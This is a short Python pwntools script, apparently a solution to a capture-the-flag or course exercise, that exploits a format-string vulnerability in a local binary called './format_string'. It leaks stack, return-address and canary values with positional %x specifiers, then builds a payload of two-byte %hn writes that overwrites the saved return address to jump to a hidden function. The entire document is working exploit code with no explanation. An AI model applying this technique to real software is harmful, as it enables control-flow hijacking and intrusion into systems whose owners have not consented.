#!/usr/bin/env python3

import sys
from pwnlib.tubes.process import process

esp_to_ebp = 74
esp_to_ret = esp_to_ebp + 1
esp_to_canary = esp_to_ebp - 3
esp_to_buf1 = 7
esp_to_buf2 = 39
main_ret_to_unavailable = -212
old_fb_to_vuln_ret = -12

executable = './format_string'
format_string = ''
for i in [esp_to_ebp, esp_to_ret, esp_to_canary]:
    format_string += '%{}$08x '.format(str(i))
format_string = format_string[0:-1]

p = process(executable)
p.sendline(bytes(format_string, 'utf-8'))
arr = p.read().decode().strip('\n').split(' ')
stack, code, canary = arr

stack_int = int('0x' + stack, 16)
ret_int = stack_int + old_fb_to_vuln_ret
ret1 = ret_int.to_bytes(4, 'little')
ret2 = (ret_int + 2).to_bytes(4, 'little')

code_int = int('0x' + code, 16)
func_addr = code_int + main_ret_to_unavailable
low_num = func_addr & 0xffff
high_num = (func_addr >> 16) & 0xffff

high_num -= low_num
low_num -= 8
while(low_num < 8):
    low_num += 0x10000
while(high_num < 8):
    high_num += 0x10000


payload = ret1 + ret2
payload += b'%' + str(low_num).encode() + b'x'
payload += b'%' + str(esp_to_buf2).encode() + b'$hn'
payload += b'%' + str(high_num).encode() + b'x'
payload += b'%' + str(esp_to_buf2 + 1).encode() + b'$hn'

p.sendline(payload)

out = p.recvall()
out = out.replace(b' ', b'')
sys.stdout.buffer.write(out)
